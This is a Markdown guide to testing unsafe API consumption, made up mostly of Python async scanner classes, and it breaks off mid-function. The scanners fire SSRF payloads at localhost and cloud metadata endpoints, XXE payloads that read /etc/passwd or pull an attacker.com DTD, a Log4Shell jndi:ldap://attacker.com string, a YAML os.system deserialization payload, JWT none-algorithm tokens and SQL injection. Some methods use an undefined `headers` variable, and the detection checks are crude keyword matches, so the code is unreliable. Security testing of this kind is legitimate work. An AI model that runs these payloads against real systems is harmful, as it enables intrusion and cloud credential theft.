# 🔐 API SECURITY TESTING | UNSAFE CONSUMPTION OF APIS

## 1 Comprehensive Unsafe API Consumption Testing Methodology

### 1.1 Unsafe Consumption Testing Framework
```yaml
Unsafe_Consumption_Testing_Framework:
  Identification_Phase:
    - External API dependency mapping
    - Third-party service integration analysis
    - Data flow between APIs tracing
    - Authentication and authorization with external services
    - Data validation and sanitization assessment
    - Error handling with external APIs review

  Exploitation_Phase:
    - SSRF via API dependencies testing
    - Insecure data processing from external APIs
    - Authentication bypass through third-party services
    - Data injection through API chain testing
    - Denial of service through external dependencies
    - Information leakage through API responses

  Validation_Phase:
    - Input validation effectiveness testing
    - Output sanitization verification
    - Error handling robustness assessment
    - Authentication chain security validation
    - Data integrity verification
    - Dependency failure handling testing
```

### 1.2 Unsafe Consumption Attack Vectors
- **Server-Side Request Forgery (SSRF):**
  - URL parameter manipulation to internal services
  - DNS rebinding attacks
  - Cloud metadata API access
  - Internal service discovery

- **Data Processing Vulnerabilities:**
  - XML External Entity (XXE) injection
  - JSON parsing vulnerabilities
  - Prototype pollution
  - Insecure deserialization

- **Authentication Bypass:**
  - JWT verification flaws
  - API key leakage through dependencies
  - Token relay attacks
  - Credential leakage in logs

## 2 Unsafe Consumption Testing Techniques

### 2.1 SSRF and External Service Testing
```python
# SSRF and External API Consumption Testing Tool
import requests
import json
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import asyncio
import aiohttp
from urllib.parse import urlparse, urljoin
import ipaddress

@dataclass
class UnsafeConsumptionResult:
    vulnerability_type: str
    endpoint: str
    technique: str
    severity: str
    evidence: str
    external_service: str
    impact: str

class SSRFAndExternalAPITester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities: List[UnsafeConsumptionResult] = []
        self.internal_services = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://[::1]',
            'http://localhost.localdomain'
        ]
        self.cloud_metadata_services = [
            'http://169.254.169.254/',  # AWS, Azure, GCP
            'http://metadata.google.internal/',  # GCP
            'http://169.254.169.254/metadata/',  # Azure
            'http://100.100.100.200/',  # Alibaba Cloud
            'http://192.168.0.1/',  # Common router
        ]
        
    async def test_ssrf_vulnerabilities(self, endpoints: List[Dict]) -> List[UnsafeConsumptionResult]:
        """Test for SSRF vulnerabilities in API endpoints"""
        results = []
        
        for endpoint in endpoints:
            if self.has_external_reference(endpoint):
                ssrf_results = await self.test_endpoint_ssrf(endpoint)
                results.extend(ssrf_results)
                
                # Test DNS rebinding
                dns_results = await self.test_dns_rebinding(endpoint)
                results.extend(dns_results)
                
                # Test cloud metadata access
                cloud_results = await self.test_cloud_metadata_access(endpoint)
                results.extend(cloud_results)
        
        return results

    async def test_endpoint_ssrf(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test SSRF on specific endpoint"""
        results = []
        
        ssrf_payloads = self.generate_ssrf_payloads()
        
        for payload in ssrf_payloads:
            try:
                test_data = endpoint.get('test_data', {}).copy()
                
                # Inject SSRF payload into potential URL parameters
                for key, value in test_data.items():
                    if any(indicator in key.lower() for indicator in ['url', 'endpoint', 'service', 'api']):
                        test_data[key] = payload['url']
                        break
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=test_data,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201, 202]:
                                response_data = await response.text()
                                
                                # Check for successful internal service access
                                if self.detect_ssrf_success(response_data, payload):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="SSRF",
                                        endpoint=endpoint['url'],
                                        technique=payload['technique'],
                                        severity="High",
                                        evidence=f"SSRF successful to {payload['url']}",
                                        external_service=payload['url'],
                                        impact="Internal service access, data leakage"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing SSRF on {endpoint['url']}: {e}")
        
        return results

    def generate_ssrf_payloads(self) -> List[Dict[str, str]]:
        """Generate SSRF test payloads"""
        payloads = []
        
        # Internal service payloads
        for service in self.internal_services:
            payloads.append({
                'url': service,
                'technique': 'Internal Service Access'
            })
            # Add variations
            payloads.append({
                'url': f"{service}:8080",
                'technique': 'Internal Service with Port'
            })
        
        # Cloud metadata payloads
        for metadata_service in self.cloud_metadata_services:
            payloads.append({
                'url': metadata_service,
                'technique': 'Cloud Metadata Access'
            })
            # Add common metadata paths
            payloads.extend([
                {'url': f"{metadata_service}latest/meta-data/", 'technique': 'AWS Metadata'},
                {'url': f"{metadata_service}computeMetadata/v1/", 'technique': 'GCP Metadata'},
                {'url': f"{metadata_service}metadata/instance/", 'technique': 'Azure Metadata'}
            ])
        
        # URL parser confusion payloads
        confusion_payloads = [
            'http://localhost@evil.com',
            'http://127.0.0.1#@evil.com',
            'http://[::]:80@evil.com',
            'http://127.1:80@evil.com'
        ]
        
        for payload in confusion_payloads:
            payloads.append({
                'url': payload,
                'technique': 'URL Parser Confusion'
            })
        
        return payloads

    async def test_dns_rebinding(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test DNS rebinding vulnerabilities"""
        results = []
        
        # Test domains that resolve to internal IPs initially
        rebinding_domains = [
            'http://rbndr.us:53/',
            'http://spoofed.burpcollaborator.net/'
        ]
        
        for domain in rebinding_domains:
            try:
                test_data = endpoint.get('test_data', {}).copy()
                
                # Inject DNS rebinding domain
                for key, value in test_data.items():
                    if any(indicator in key.lower() for indicator in ['url', 'endpoint', 'service']):
                        test_data[key] = domain
                        break
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=test_data,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                # Check for internal service responses
                                if self.detect_internal_service_response(response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="DNS Rebinding",
                                        endpoint=endpoint['url'],
                                        technique="DNS Rebinding Attack",
                                        severity="High",
                                        evidence=f"DNS rebinding successful with {domain}",
                                        external_service=domain,
                                        impact="Internal network access bypassing firewall"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing DNS rebinding on {endpoint['url']}: {e}")
        
        return results

    async def test_cloud_metadata_access(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test cloud metadata service access"""
        results = []
        
        for metadata_url in self.cloud_metadata_services:
            try:
                test_data = endpoint.get('test_data', {}).copy()
                
                # Test direct metadata access
                for key, value in test_data.items():
                    if any(indicator in key.lower() for indicator in ['url', 'endpoint']):
                        test_data[key] = metadata_url
                        break
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=test_data,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                # Check for cloud metadata in response
                                if self.detect_cloud_metadata(response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="Cloud Metadata Access",
                                        endpoint=endpoint['url'],
                                        technique="Cloud Metadata API Access",
                                        severity="Critical",
                                        evidence=f"Cloud metadata access: {metadata_url}",
                                        external_service=metadata_url,
                                        impact="Cloud credential theft, instance compromise"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing cloud metadata on {endpoint['url']}: {e}")
        
        return results

    def has_external_reference(self, endpoint: Dict) -> bool:
        """Check if endpoint has external service references"""
        test_data = endpoint.get('test_data', {})
        for key, value in test_data.items():
            if any(indicator in key.lower() for indicator in ['url', 'endpoint', 'api', 'service']):
                return True
        return False

    def detect_ssrf_success(self, response_data: str, payload: Dict) -> bool:
        """Detect successful SSRF based on response content"""
        success_indicators = [
            'localhost', '127.0.0.1', 'internal', 'private',
            'metadata', 'instance-data', 'cloud', 'aws', 'azure', 'gcp'
        ]
        
        response_lower = response_data.lower()
        return any(indicator in response_lower for indicator in success_indicators)

    def detect_internal_service_response(self, response_data: str) -> bool:
        """Detect internal service responses"""
        internal_indicators = [
            'development', 'test', 'internal', 'staging',
            'localhost', '127.0.0.1', '192.168', '10.', '172.'
        ]
        
        response_lower = response_data.lower()
        return any(indicator in response_lower for indicator in internal_indicators)

    def detect_cloud_metadata(self, response_data: str) -> bool:
        """Detect cloud metadata in response"""
        metadata_indicators = [
            'instance-id', 'ami-id', 'hostname', 'public-keys',
            'security-groups', 'iam/', 'role', 'access-key'
        ]
        
        response_lower = response_data.lower()
        return any(indicator in response_lower for indicator in metadata_indicators)
```

### 2.2 Insecure Data Processing Testing
```python
# Insecure Data Processing Testing Tool
class InsecureDataProcessingTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities: List[UnsafeConsumptionResult] = []
        
    async def test_data_processing_vulnerabilities(self, endpoints: List[Dict]) -> List[UnsafeConsumptionResult]:
        """Test insecure data processing from external APIs"""
        results = []
        
        for endpoint in endpoints:
            # Test XXE vulnerabilities
            xxe_results = await self.test_xxe_vulnerabilities(endpoint)
            results.extend(xxe_results)
            
            # Test JSON parsing vulnerabilities
            json_results = await self.test_json_parsing_vulnerabilities(endpoint)
            results.extend(json_results)
            
            # Test prototype pollution
            prototype_results = await self.test_prototype_pollution(endpoint)
            results.extend(prototype_results)
            
            # Test insecure deserialization
            deserialization_results = await self.test_insecure_deserialization(endpoint)
            results.extend(deserialization_results)
        
        return results

    async def test_xxe_vulnerabilities(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test XML External Entity vulnerabilities"""
        results = []
        
        xxe_payloads = [
            # Basic XXE
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            # External DTD
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">%ext;]><root></root>',
            # SSRF via XXE
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>'
        ]
        
        for payload in xxe_payloads:
            try:
                headers = {
                    'Content-Type': 'application/xml',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            data=payload,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                # Check for XXE success indicators
                                if self.detect_xxe_success(response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="XXE",
                                        endpoint=endpoint['url'],
                                        technique="XML External Entity Injection",
                                        severity="High",
                                        evidence="XXE payload processed successfully",
                                        external_service="XML Parser",
                                        impact="File read, SSRF, denial of service"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing XXE on {endpoint['url']}: {e}")
        
        return results

    async def test_json_parsing_vulnerabilities(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test JSON parsing vulnerabilities"""
        results = []
        
        json_payloads = [
            # Large JSON to test resource exhaustion
            {'malicious': 'x' * 1000000},
            # Deeply nested JSON
            self.generate_deep_json(100),
            # Prototype pollution attempts
            {'__proto__': {'isAdmin': True}},
            {'constructor': {'prototype': {'isAdmin': True}}},
            # JSON with special characters
            {'key': 'value' + '\x00' + 'injected'},
            # Array with excessive elements
            {'array': list(range(100000))}
        ]
        
        for payload in json_payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=payload,
                            headers=headers
                        ) as response:
                            
                            # Check for parsing errors or unexpected behavior
                            if response.status in [500, 413] or response.status == 200:
                                response_data = await response.text()
                                
                                if self.detect_json_parsing_vulnerability(response_data, response.status):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="JSON Parsing",
                                        endpoint=endpoint['url'],
                                        technique="JSON Parsing Attack",
                                        severity="Medium",
                                        evidence="JSON parsing vulnerability detected",
                                        external_service="JSON Parser",
                                        impact="Denial of service, prototype pollution"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing JSON parsing on {endpoint['url']}: {e}")
        
        return results

    async def test_prototype_pollution(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test prototype pollution vulnerabilities"""
        results = []
        
        pollution_payloads = [
            # Basic prototype pollution
            {'__proto__': {'polluted': 'true'}},
            {'constructor': {'prototype': {'polluted': 'true'}}},
            # Nested prototype pollution
            {'a': {'__proto__': {'polluted': 'true'}}},
            # Array prototype pollution
            {'__proto__': {'0': 'polluted'}},
            # Function prototype pollution
            {'__proto__': {'toString': 'polluted'}}
        ]
        
        for payload in pollution_payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=payload,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                # Check if pollution was successful
                                if self.detect_prototype_pollution(response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="Prototype Pollution",
                                        endpoint=endpoint['url'],
                                        technique="JavaScript Prototype Pollution",
                                        severity="High",
                                        evidence="Prototype pollution successful",
                                        external_service="JavaScript Engine",
                                        impact="Property injection, code execution"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing prototype pollution on {endpoint['url']}: {e}")
        
        return results

    async def test_insecure_deserialization(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test insecure deserialization vulnerabilities"""
        results = []
        
        # Test various serialization formats
        serialization_payloads = [
            # Python pickle
            {'data': 'gASVCAAAAAAAAACMBG5hbWWUfZR9lC4='},
            # Java serialized object
            {'data': 'rO0ABXQABHRlc3Q='},
            # NET serialized object
            {'data': 'AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0u'},
            # YAML with anchors
            {'data': '!!python/object/apply:os.system\nargs: ["whoami"]'}
        ]
        
        for payload in serialization_payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=payload,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201, 500]:
                                response_data = await response.text()
                                
                                # Check for deserialization indicators
                                if self.detect_deserialization_vulnerability(response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="Insecure Deserialization",
                                        endpoint=endpoint['url'],
                                        technique="Unsafe Object Deserialization",
                                        severity="Critical",
                                        evidence="Insecure deserialization detected",
                                        external_service="Deserialization Engine",
                                        impact="Remote code execution, system compromise"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing deserialization on {endpoint['url']}: {e}")
        
        return results

    def generate_deep_json(self, depth: int) -> Dict:
        """Generate deeply nested JSON"""
        result = {}
        current = result
        for i in range(depth):
            current['nested'] = {}
            current = current['nested']
        return result

    def detect_xxe_success(self, response_data: str) -> bool:
        """Detect successful XXE exploitation"""
        xxe_indicators = [
            'root:', 'daemon:', 'bin/', 'etc/passwd',
            'instance-id', 'ami-', 'metadata'
        ]
        
        response_lower = response_data.lower()
        return any(indicator in response_lower for indicator in xxe_indicators)

    def detect_json_parsing_vulnerability(self, response_data: str, status_code: int) -> bool:
        """Detect JSON parsing vulnerabilities"""
        if status_code == 413:  # Payload too large
            return True
        if status_code == 500 and 'stack' in response_data.lower():
            return True
        if 'error' in response_data.lower() and 'parsing' in response_data.lower():
            return True
        return False

    def detect_prototype_pollution(self, response_data: str) -> bool:
        """Detect prototype pollution success"""
        pollution_indicators = [
            'polluted', 'prototype', '__proto__',
            'constructor', 'toString'
        ]
        
        response_lower = response_data.lower()
        return any(indicator in response_lower for indicator in pollution_indicators)

    def detect_deserialization_vulnerability(self, response_data: str) -> bool:
        """Detect deserialization vulnerabilities"""
        deserialization_indicators = [
            'pickle', 'serialization', 'yaml',
            'deserialization', 'unpickle'
        ]
        
        response_lower = response_data.lower()
        return any(indicator in response_lower for indicator in deserialization_indicators)
```

### 2.3 Authentication and Authorization Testing
```python
# Authentication and Authorization Testing for External APIs
class ExternalAPIAuthTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities: List[UnsafeConsumptionResult] = []
        
    async def test_external_api_auth_vulnerabilities(self, endpoints: List[Dict]) -> List[UnsafeConsumptionResult]:
        """Test authentication and authorization with external APIs"""
        results = []
        
        for endpoint in endpoints:
            # Test JWT verification flaws
            jwt_results = await self.test_jwt_verification(endpoint)
            results.extend(jwt_results)
            
            # Test API key leakage
            key_results = await self.test_api_key_leakage(endpoint)
            results.extend(key_results)
            
            # Test token relay attacks
            relay_results = await self.test_token_relay(endpoint)
            results.extend(relay_results)
            
            # Test credential leakage
            credential_results = await self.test_credential_leakage(endpoint)
            results.extend(credential_results)
        
        return results

    async def test_jwt_verification(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test JWT verification vulnerabilities"""
        results = []
        
        jwt_payloads = [
            # None algorithm
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
            # HS256 with public key
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
            # Expired token
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1MTYyMzkwMjIsIm5hbWUiOiJKb2huIERvZSIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'
        ]
        
        for jwt_token in jwt_payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {jwt_token}',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'GET':
                        async with session.get(
                            f"{self.base_url}{endpoint['url']}",
                            headers=headers
                        ) as response:
                            
                            if response.status == 200:
                                result = UnsafeConsumptionResult(
                                    vulnerability_type="JWT Verification",
                                    endpoint=endpoint['url'],
                                    technique="JWT Verification Bypass",
                                    severity="High",
                                    evidence="JWT verification bypassed with malformed token",
                                    external_service="JWT Validator",
                                    impact="Authentication bypass, privilege escalation"
                                )
                                results.append(result)
            
            except Exception as e:
                print(f"Error testing JWT on {endpoint['url']}: {e}")
        
        return results

    async def test_api_key_leakage(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test API key leakage through external services"""
        results = []
        
        # Test if API keys are exposed in responses
        try:
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Security-Test'
            }
            
            async with aiohttp.ClientSession() as session:
                if endpoint['method'] == 'GET':
                    async with session.get(
                        f"{self.base_url}{endpoint['url']}",
                        headers=headers
                    ) as response:
                        
                        if response.status == 200:
                            response_data = await response.text()
                            
                            # Check for API key patterns
                            api_key_patterns = [
                                r'[a-zA-Z0-9]{32}',  # 32 char hex
                                r'sk_[a-zA-Z0-9]{24}',  # Stripe-like
                                r'AKIA[0-9A-Z]{16}',  # AWS key
                                r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'  # UUID
                            ]
                            
                            for pattern in api_key_patterns:
                                import re
                                if re.search(pattern, response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="API Key Leakage",
                                        endpoint=endpoint['url'],
                                        technique="Sensitive Data Exposure",
                                        severity="High",
                                        evidence="API key found in response",
                                        external_service="External API",
                                        impact="Credential theft, unauthorized access"
                                    )
                                    results.append(result)
                                    break
            
        except Exception as e:
            print(f"Error testing API key leakage on {endpoint['url']}: {e}")
        
        return results

    async def test_token_relay(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test token relay attacks"""
        results = []
        
        # Test if tokens can be relayed to different services
        relay_payloads = [
            {'token': 'relayed_token', 'service': 'internal'},
            {'auth': 'relayed_auth', 'target': 'admin'}
        ]
        
        for payload in relay_payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=payload,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                # Check for token relay success
                                if 'relayed' in response_data.lower():
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="Token Relay",
                                        endpoint=endpoint['url'],
                                        technique="Token Relay Attack",
                                        severity="Medium",
                                        evidence="Token relay attack successful",
                                        external_service="Authentication Service",
                                        impact="Privilege escalation, unauthorized access"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing token relay on {endpoint['url']}: {e}")
        
        return results

    async def test_credential_leakage(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test credential leakage in logs and errors"""
        results = []
        
        # Test with credentials in requests
        credential_payloads = [
            {'username': 'admin', 'password': 'leaked_password'},
            {'api_key': 'sk_test_leaked_key'},
            {'secret': 'very_secret_value'}
        ]
        
        for payload in credential_payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=payload,
                            headers=headers
                        ) as response:
                            
                            # Check if credentials appear in error messages
                            if response.status >= 400:
                                response_data = await response.text()
                                
                                for key, value in payload.items():
                                    if value in response_data:
                                        result = UnsafeConsumptionResult(
                                            vulnerability_type="Credential Leakage",
                                            endpoint=endpoint['url'],
                                            technique="Sensitive Data in Errors",
                                            severity="Medium",
                                            evidence=f"Credential leaked in error: {key}",
                                            external_service="Error Handler",
                                            impact="Credential exposure, information disclosure"
                                        )
                                        results.append(result)
                                        break
            
            except Exception as e:
                print(f"Error testing credential leakage on {endpoint['url']}: {e}")
        
        return results
```

## 3 Advanced Unsafe Consumption Testing

### 3.1 Dependency Chain Testing
```python
# Dependency Chain Testing Tool
class DependencyChainTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities: List[UnsafeConsumptionResult] = []
        
    async def test_dependency_chain_vulnerabilities(self, endpoints: List[Dict]) -> List[UnsafeConsumptionResult]:
        """Test vulnerabilities in API dependency chains"""
        results = []
        
        for endpoint in endpoints:
            # Test data flow between APIs
            data_flow_results = await self.test_data_flow_vulnerabilities(endpoint)
            results.extend(data_flow_results)
            
            # Test dependency failure handling
            failure_results = await self.test_dependency_failure_handling(endpoint)
            results.extend(failure_results)
            
            # Test timing attacks through dependencies
            timing_results = await self.test_timing_attacks(endpoint)
            results.extend(timing_results)
        
        return results

    async def test_data_flow_vulnerabilities(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test data flow vulnerabilities between APIs"""
        results = []
        
        # Test if untrusted data from one API is passed to another without validation
        data_flow_payloads = [
            {'input': '<script>alert("xss")</script>'},
            {'data': '${jndi:ldap://attacker.com/exploit}'},  # Log4Shell
            {'query': '1; DROP TABLE users--'},
            {'url': 'http://evil.com/malicious.xml'}
        ]
        
        for payload in data_flow_payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=payload,
                            headers=headers
                        ) as response:
                            
                            if response.status in [200, 201]:
                                response_data = await response.text()
                                
                                # Check if payload was processed without sanitization
                                if self.detect_unsafe_data_flow(response_data, payload):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="Unsafe Data Flow",
                                        endpoint=endpoint['url'],
                                        technique="Unvalidated Data Propagation",
                                        severity="High",
                                        evidence="Unsafe data flowed through API chain",
                                        external_service="API Dependency Chain",
                                        impact="Code injection, data corruption"
                                    )
                                    results.append(result)
            
            except Exception as e:
                print(f"Error testing data flow on {endpoint['url']}: {e}")
        
        return results

    async def test_dependency_failure_handling(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test how API handles dependency failures"""
        results = []
        
        # Test with dependency timeout or failure scenarios
        failure_scenarios = [
            {'service': 'timeout', 'delay': 30000},  # 30 second timeout
            {'endpoint': 'http://unreachable-service.com'},
            {'api_key': 'invalid_key_12345'}
        ]
        
        for scenario in failure_scenarios:
            try:
                test_data = endpoint.get('test_data', {}).copy()
                test_data.update(scenario)
                
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=test_data,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            
                            # Check error handling
                            if response.status >= 500:
                                response_data = await response.text()
                                
                                # Check for information disclosure in errors
                                if self.detect_failure_information_leakage(response_data):
                                    result = UnsafeConsumptionResult(
                                        vulnerability_type="Dependency Failure Handling",
                                        endpoint=endpoint['url'],
                                        technique="Poor Error Handling",
                                        severity="Medium",
                                        evidence="Information leakage in dependency failure",
                                        external_service="External Dependency",
                                        impact="Information disclosure, system enumeration"
                                    )
                                    results.append(result)
            
            except asyncio.TimeoutError:
                # Check if timeout is handled gracefully
                result = UnsafeConsumptionResult(
                    vulnerability_type="Dependency Timeout Handling",
                    endpoint=endpoint['url'],
                    technique="Unhandled Timeout",
                    severity="Low",
                    evidence="Dependency timeout not handled properly",
                    external_service="External Dependency",
                    impact="Denial of service, poor user experience"
                )
                results.append(result)
            
            except Exception as e:
                print(f"Error testing dependency failure on {endpoint['url']}: {e}")
        
        return results

    async def test_timing_attacks(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test timing attacks through external dependencies"""
        results = []
        
        # Test for timing differences in authentication
        timing_payloads = [
            {'username': 'admin', 'password': 'a' * 100},
            {'username': 'nonexistent', 'password': 'a' * 100},
            {'api_key': 'a' * 100}
        ]
        
        timings = []
        
        for payload in timing_payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Security-Test'
                }
                
                start_time = asyncio.get_event_loop().time()
                
                async with aiohttp.ClientSession() as session:
                    if endpoint['method'] == 'POST':
                        async with session.post(
                            f"{self.base_url}{endpoint['url']}",
                            json=payload,
                            headers=headers
                        ) as response:
                            
                            end_time = asyncio.get_event_loop().time()
                            response_time = end_time - start_time
                            timings.append((payload, response_time))
            
            except Exception as e:
                print(f"Error testing timing attack on {endpoint['url']}: {e}")
        
        # Analyze timing differences
        if len(timings) >= 2:
            time_differences = []
            for i in range(1, len(timings)):
                diff = abs(timings[i][1] - timings[i-1][1])
                time_differences.append(diff)
            
            # If significant timing difference detected
            if any(diff > 0.1 for diff in time_differences):  # 100ms difference
                result = UnsafeConsumptionResult(
                    vulnerability_type="Timing Attack",
                    endpoint=endpoint['url'],
                    technique="Timing Side Channel",
                    severity="Low",
                    evidence="Significant timing differences detected",
                    external_service="Authentication Service",
                    impact="User enumeration, information disclosure"
                )
                results.append(result)
        
        return results

    def detect_unsafe_data_flow(self, response_data: str, payload: Dict) -> bool:
        """Detect unsafe data flow through APIs"""
        # Check if unsanitized input appears in output
        for value in payload.values():
            if str(value) in response_data:
                return True
        return False

    def detect_failure_information_leakage(self, response_data: str) -> bool:
        """Detect information leakage in dependency failures"""
        leakage_indicators = [
            'stack trace', 'internal error', 'database',
            'sql', 'query', 'file path', 'class name'
        ]
        
        response_lower = response_data.lower()
        return any(indicator in response_lower for indicator in leakage_indicators)
```

### 3.2 Advanced SSRF Techniques
```python
# Advanced SSRF Testing Techniques
class AdvancedSSRFTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities: List[UnsafeConsumptionResult] = []
        
    async def test_advanced_ssrf_techniques(self, endpoints: List[Dict]) -> List[UnsafeConsumptionResult]:
        """Test advanced SSRF techniques"""
        results = []
        
        for endpoint in endpoints:
            if self.has_url_parameter(endpoint):
                # Test URL parser bypasses
                parser_results = await self.test_url_parser_bypasses(endpoint)
                results.extend(parser_results)
                
                # Test DNS rebinding with custom domains
                dns_results = await self.test_advanced_dns_rebinding(endpoint)
                results.extend(dns_results)
                
                # Test gopher and other protocols
                protocol_results = await self.test_alternative_protocols(endpoint)
                results.extend(protocol_results)
        
        return results

    async def test_url_parser_bypasses(self, endpoint: Dict) -> List[UnsafeConsumptionResult]:
        """Test URL parser bypass techniques"""
        results = []
        
        bypass_payloads = [
            # URL encoding bypass
            'http://127.0.0.1%00@evil.com',
            'http://127.1:80@evil.com',
            # Decimal and hexadecimal IPs
            'http://2130706433/',  # 127.0.0.1 in decimal
            'http://0x7f000001/',  # 127.0.0.1 in hex
            # IPv6 variations
            'http://[::]:80@evil.com',
            'http://[::ffff:127.0.0.1]/'
        ]
        
        for payload in bypass_payloads:
            try:
                test_data = endpoint.get('test_data', {}).copy()
                
                # Inject bypass payload
                for key, value in test_data.items():
                    if any(indicator in key.lower() for indicator in ['url', 'endpoint']):
                        test_data[key] = payload
                        break
                
                headers = {
                    'Content-Type': 'application/json',
